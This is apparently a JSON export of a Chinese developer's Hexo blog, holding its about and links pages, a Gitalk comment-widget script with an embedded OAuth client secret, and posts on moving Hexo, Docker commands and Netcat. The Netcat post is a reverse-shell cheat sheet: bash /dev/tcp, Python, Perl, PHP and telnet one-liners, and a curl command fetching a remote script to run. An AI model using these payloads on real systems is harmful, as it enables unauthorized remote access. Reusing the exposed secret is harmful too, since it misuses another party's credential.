{"pages":[{"title":"","text":"个人简介 分享很喜欢的老罗的一段话： “每一个生命来到世间都注定改变世界，别无选择。要么变得好一点，要么变得坏一点。你如果走进社会为了生存为了什么不要脸的理由，变成了一个恶心的成年人社会中的一员，那你就把这个世界变得恶心了一点点。如果你一生刚正不阿，如果你一生耿直，没有做任何恶心的事情，没做对别人有害的事情，一辈子拼了老命勉强把自己身边的几个人照顾好了，没有成名没有发财，没有成就伟大的事业，然后耿着脖子一生正直，到了七八十岁耿着脖子去世了。你这一生是不是没有改变世界？你还是改变世界了，你把这个世界变得美好了一点点。因为世界上又多了一个好人。“ 善恶终有报,天道好轮回。不信抬头看,苍天饶过谁。无论何时何地，我们都要保持一颗积极乐观、善良感恩的心。但行好事莫问前程，永远年轻，永远热内盈眶，永远保持正能量。💪💪💪💪💪💪冲鸭！！！！ -&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;个人信息：计算机科学与技术专业从事JAVA后端开发码畜一枚坚信代码改变世界 博客信息 网站采用的Icarus主题 追求尽可能的简洁，清晰，易用。 在Icarus主题之上进行了部分修改。 更新日志：–2020.09.20：icarus4.0适配–2020.01.18：icarus3.0适配–2019.11.17：增加深色主题开关–2019.10.30：去图，精简卡片–2019.10.22：改版部分显示，优化速度–2019.10.16：文章列表加上评论数显示–2019.10.13：改版评论–2019.09.25：图片、资源接入CDN免费jsDelivr、文章加入置顶–2019.09.19：开源博客代码–2019.09.19：修改布局，拉伸布局，更宽的展示–2019.09.18：修改友链ui为一行三个，并适配移动端，暗黑模式文章增加评论链接，增加留言链接–2019.09.14：增加精简next主题–2019.09.14：利用中秋节放假，重做了首页的热门推荐、加个widget最新评论框、归档页加入文章贡献概览面板 本站推荐索引 博客主题相关 github Issue 作为博客微型数据库的应用 github page网站cdn优化加速 博客源码分享 博客换肤的一种实现方式思路 博客中gitalk最新评论的获取 博客图片上传picgo工具github图传使用 安装、部分配置icarus主题中文版 技术知识点 Java并发知识点 法律法规 法律法规数据库 中华人民共和国国旗法 中华人民共和国宪法 中华人民共和国消费者权益保护法 中华人民共和国刑事诉讼法 中华人民共和国婚姻法 中华人名共和国网络安全法 中华人民共和国劳动法 其他 网易云音乐歌单分享 计划2020计划 2019.12.31 2020-GOALS 跑两三场马拉松 2019计划 2018.12.31/21:59:00-&gt;更新于2019.12.31 2019-GOALS 购买的专业书籍至少看完一遍（并发、重构、设计模式…）-&gt; 95% 额外： 追了很多剧 总结： 有优点有缺点，没坚持下来的还是太多，追了太多剧。以后多学习，多思考！ 时间轴记录","link":"/about/index.html"},{"title":"","text":"🎈🎈微笑墙🎈🎈 彭小苒 唐艺昕 李一桐 gakki 图片搜集于互联网，侵权请留言，马上处理😊。","link":"/album/index.html"},{"title":"","text":"申请友链须知 原则上只和技术类博客交换，但不包括含有和色情、暴力、政治敏感的网站。 不和剽窃、侵权、无诚信的网站交换，优先和具有原创作品的网站交换。 申请请提供：站点名称、站点链接、站点描述、logo或头像（不要设置防盗链）。 排名不分先后，刷新后重排，更新信息后请留言告知。 会定期清理很久很久不更新的、不符合要求的友链，不再另行通知。 本站不存储友链图片，如果友链图片换了无法更新。图片裂了的会替换成默认图，需要更换的请留言告知。 本站友链信息如下，申请友链前请先添加本站信息： 网站图标：https://removeif.github.io/images/avatar.jpg 网站名称：辣椒の酱 网站地址：https://removeif.github.io 网站简介：后端开发，技术分享 加载中，稍等几秒...","link":"/friend/index.html"},{"title":"","text":"&nbsp;&nbsp;听听音乐 音乐播放器由mePlayer提供，布局参照网友博客所作，感谢作者的辛勤付出。更多音乐分享请查看歌单。 &nbsp;&nbsp;看看视频 ->点击以下条目开始播放视频,向下滑动查看更多","link":"/media/index.html"},{"title":"","text":"来而不往非礼也畅所欲言，有留必应","link":"/message/index.html"},{"title":"音乐歌单收藏","text":"温馨提示：选择喜欢的音乐双击播放，由于版权原因部分不能播放。如果喜欢歌单收藏一下，去网易云都能播放哟！","link":"/music/index.html"},{"title":"","text":"碎碎念 tips：github登录后按时间正序查看、可点赞加❤️、本插件地址..「+99次查看」 碎碎念加载中，请稍等... $.getScript(\"/js/gitalk_self.min.js\", function () { var gitalk = new Gitalk({ clientID: '46a9f3481b46ea0129d8', clientSecret: '79c7c9cb847e141757d7864453bcbf89f0655b24', id: '666666', repo: 'issue_database', owner: 'removeif', admin: \"removeif\", createIssueManually: true, distractionFreeMode: false }); gitalk.render('comment-container1'); });","link":"/self-talking/index.html"}],"posts":[{"title":"hexo迁移到新电脑","text":"拷贝源文件将下面的文件或文件夹复制到新的博客目录下进行替换 12345_config.ymlpackage.json scaffolds/ source/themes/ 环境部署在新电脑上安装 nodejs 和 Git安装完了之后 新建一个目录把博客文件解压到文件夹 打开 Git bash 12$ git config --global user.name &quot;username&quot;$ git config --global user.email &quot;username@example.com&quot; 然后切换到用户主目录 12$ ssh-keygen -t rsa -C “youremail@example.com” 输入邮件地址一路回车 完成会在 .ssh 目录下生成 SSH 密钥 输入 cat ~/.ssh/id_rsa.pub 查看公钥 复制添加到Coding或者Github 接着切换到博客目录输入 npm install hexo-cli -g 安装hexo 然后直接 12$ hexo g$ hexo d 一些错误 (坑)我之前博客是双线部署coding+GitHub 换电脑后只部署到coding 我开始是直接注释 123456deploy: type: git repo: #Github：https://github.com/funny/funny.github.io.git Coding：git@e.coding.net:funny/blog/blog.git branch: master 然后就开始了 hexo d 的时候一直报错 Please make sure you have the correct access rights and the repository exists解决方法运行下面命令设置一下Git终端禁用自动转换功能就行 12git config --global core.autocrlf false 我就遇到了这些问题 以后遇到再更新吧","link":"/hexo%E8%BF%81%E7%A7%BB%E5%88%B0%E6%96%B0%E7%94%B5%E8%84%91.html"},{"title":"Docker学习笔记","text":"Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从 Apache2.0 协议开源。 Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。 容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。 官网地址：https://docs.docker.com 中文网址：https://www.docker-cn.com Docker 中国官方镜像加速地址：https://www.docker-cn.com/registry-mirror Docker hub地址：https://hub.docker.com 1.1.简介Docker是基于Go语言开发的一个项目，它的理念就是：“一次封装，到处运行”，基于我们常用的虚拟机而演变而来，也就是说Docker是一种虚拟化技术。诞生的原因是为了解决了运行环境和配置问题软件容器，方便做持续集成并有助于整体发布的容器虚拟化技术。 1.2.安装Docker 官方为了简化安装流程，提供了一套安装脚本，Ubuntu 和 Debian 系统可 以使用这套脚本安装： 1curl -sSL https://get.docker.com/ | sh 执行这个命令后，脚本就会自动的将一切准备工作做好，并且把 Docker 安装在系 统中。 在国内使用这个脚本可能会出现某些下载出现错误的 情况。国内的一些云服务商提供了这个脚本的修改版本，使其使用国内的 Docker 软件源镜像安装，这样就避免了墙的干扰。 阿里云的安装脚本：1curl -sSL http://acs-public-mirror.oss-cn-hangzhou.aliyuncs.com/docker-engine/internet | sh - 1.3.名词说明Docker镜像：镜像是一个只读的模版，我们使用镜像来创建我们的Docker容器，一个镜像可以创建多个实例， Docker容器：容器就是使用镜像创建的一个个运行实例。类比java中的面向对象，容器就是对象，镜像就是类。 Docker仓库：就是存放docker镜像的地方。 1.4.常用命令123docker version：查看docker版本。docker info：查看docker相信信息。docker --help：查看docker的命令说明。 1.4.1.docker镜像命令1234567891011121314docker images：查看本机里已经存在的docker镜像。 -a ：列出所有的docker镜像，含中间镜像层。 -q：只显示docker镜像的ID。 --digests：显示docker镜像的摘要信息。 --no-trunc ：显示完整的镜像信息 .docker search redis：搜索某个镜像。-s : 列出收藏数不小于指定值的镜像。--no-trunc : 显示完整的镜像描述 。--automated : 只列出 automated build类型的镜像。docker pull redis：拉取redis的最新版本。docker rmi c6ffcb0ee97e：删除镜像。docker rmi -f 镜像ID ：删除单个。docker rmi -f 镜像名1:TAG 镜像名2:TAG ：删除多个。docker rmi -f $(docker images -qa) ：删除全部。 1.4.2.docker容器命令run [OPTIONS] IMAGE [COMMAND][ARG...] ：新建并启动容器1234567891011121314151617181920212223242526--name：指定容器的名字。-d：后台运行。-p：端口映射。docker ps：列出所有正在运行的容器-a：列出所有的容器，包括运行的或者之前运行的。docker start 817cf3ed90e8：启动某个容器。docker restart 817cf3ed90e8：重启某个容器。docker stop 817cf3ed90e8：停止某一个容器。docker kill 817cf3ed90e8：强行停止某一个容器。docker rm 容器ID ：删除已经停止的容器。docker rm -f $(docker ps -a -q) ：一次删除多个容器。docker ps -a -q | xargs docker rm ：一次删除多个容器，采用命令组合的批处理模式。docker logs -f -t --tail 容器ID ：查看容器日志-t 是加入时间戳-f 跟随最新的日志打印--tail 数字 显示最后多少条docker top 容器ID ：查看容器内运行的进程docker inspect 容器ID ：查看容器内部细节docker cp 容器ID:容器内路径 目的主机路径 ：从容器内拷贝文件到主机上 1.4.3.启动容器的两种方式启动交互式容器 1docker run -it 容器名 启动守护式容器 1docker run -d 容器名 #Docker容器后台运行,就必须有一个前台进程. 1.4.4.进入容器进行命令操作可以使用启动交互式容器的命令docker run -it 容器名进入容器，使用exit容器停止退出，或者ctrl+P+Q容器不停止退出，退出后使用下列命令再次进入容器进行交互。 docker attach 容器ID ：这种命令是直接进入容器并启动命令终端，不会启动新的进程。docker exec -it 容器ID bashShell （脚本：例如：ls -l /tmp）,在宿主机上执行脚本得到容器内部的信息。这个命令不会打开容器的命令终端。 1.5.Docker镜像","link":"/Docker%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"},{"title":"Netcat反弹Shell详解","text":"Windows：进入下载地址下载文件 https://eternallybored.org/misc/netcat/ 将文件夹中的对应可执行文件复制到C:\\Windows\\System32的文件夹下(有32位版和64位版) 直接打开cmd输入nc XXXXXX执行就好 Linux：直接使用nc命令就好 常用的命令：#windows 1nc -e cmd.exe -d IP port(靶机) #Linux 1234nc -lvvp 8080(监听机) 监听8080端口nc IP Port (受害者机) IP为监听机的IP 端口为监听机开的端口bash -i &gt;&amp; /dev/tcp/3.16.30.73/1231 0&gt;&amp;1(受害者机)&lt;!--more--&gt; 主要参数12345678910111213141516171819202122232425262728293031323334353637#无命令行界面,使用后台模式-d#程序重定向 -e#源路由跳跃点, 不超过8-g#源路由指示器: 4, 8, 12, ...-G #获取帮助信息-h #延时设置,端口扫描时使用-i#监听入站信息-l #监听知道NetCat被结束(可断开重连)-L#以数字形式表示的IP地址-n#使进制记录-o#打开本地端口-p#随机本地和远程的端口-r#本地源地址-s#以TELNET的形式应答入站请求-t #UDP 模式-u #显示详细信息 [使用=vv获取更详细的信息]-v #连接超时设置-w#I/O 模式 [扫描时使用]-z 常见反弹的方法所用用例中的127.0.0.1为接收机器的IP，6666位接收机器的端口正常的反弹 1bash -i &gt;&amp; /dev/tcp/127.0.0.1/6666 0&gt;&amp;1 改文件名反弹1./test -i &gt;&amp; /dev/tcp/127.0.0.1/6666 0&gt;&amp;1 下载文件后执行反弹12curl -o /tmp/x.py https://raw.githubusercontent.com/y1ng1996/VulScript/master/back.pypython /tmp/x.py 127.0.0.1 6666 写python代码反弹1python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;127.0.0.1&quot;,6666));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);' 写perl代码反弹1perl -e 'use Socket;$i=&quot;127.0.0.1&quot;;$p=6666;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);};' 用php代码反弹1php -r '$sock=fsockopen(&quot;127.0.0.1&quot;,6666);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);' 用telnet反弹12telnet 127.0.0.1 6666| /bin/bash | telnet 139.217.21.35 5555","link":"/Netcat%E5%8F%8D%E5%BC%B9Shell%E8%AF%A6%E8%A7%A3.html"}],"tags":[],"categories":[]}